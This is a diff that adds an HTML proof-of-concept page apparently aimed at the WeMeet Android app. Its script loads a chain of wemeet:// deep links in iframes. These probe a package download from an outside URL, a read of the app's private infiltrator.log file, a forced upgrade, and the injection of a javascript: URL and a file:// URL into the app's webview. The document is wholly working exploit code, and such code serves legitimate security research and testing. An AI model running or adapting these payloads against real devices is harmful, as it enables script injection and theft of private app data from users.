@@ -1,0 +1,29 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P7</h1>
+<script>
+document.title='P7-START';
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+var steps=[
+  function(){ frame('wemeet://page/package_download?url='+encodeURIComponent('https://httpbin.org/bytes/32'),'P7-PKG'); },
+  function(){ frame('wemeet://filepath?path=/data/data/com.tencent.wemeet.app/files/infiltrator_logs/infiltrator.log','P7-FP'); },
+  function(){ frame('wemeet://page/upgrade_app','P7-UPG'); },
+  function(){ frame('wemeet://page/webview?url='+encodeURIComponent('javascript:document.title="P7-JS-OK"'),'P7-JS'); },
+  function(){ frame('wemeet://page/webview?url='+encodeURIComponent('file:///data/data/com.tencent.wemeet.app/files/infiltrator_logs/infiltrator.log'),'P7-FILE'); },
+  function(){ frame('wemeet://page/webview?url='+encodeURIComponent('https://httpbin.org/html'),'P7-HB'); }
+];
+var i=0;
+function next(){
+  if(i>=steps.length){ document.title='P7-DONE'; return; }
+  try{ steps[i](); }catch(e){ document.title='P7-EX'; }
+  i++;
+  setTimeout(next, 2200);
+}
+setTimeout(next, 500);
+</script>
+</body></html>
